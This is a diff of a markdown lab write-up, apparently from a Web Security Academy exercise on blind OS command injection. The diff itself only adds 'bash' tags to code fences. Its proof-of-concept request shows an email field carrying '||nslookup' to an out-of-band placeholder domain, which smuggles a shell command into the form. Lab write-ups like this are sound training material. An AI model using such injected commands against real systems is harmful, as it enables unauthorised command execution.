@@ -27,7 +27,7 @@ The application's feedback submission function (`/feedback/submit`) passes the u
 ## Proof of Concept
 
 Request (Burp Repeater):
-```
+```bash
 POST /feedback/submit HTTP/2
 Host: 0aab001503cf4712811634e0006c00e9.web-security-academy.net
 Content-Type: application/x-www-form-urlencoded
@@ -36,7 +36,7 @@ csrf=<token>&name=mmm&email=x||nslookup+x.<OOB-DOMAIN>||&subject=os&message=aa
 ```
 
 Response:
-```
+```bash
 HTTP/2 200 OK
 Content-Type: application/json; charset=utf-8
 Content-Length: 2
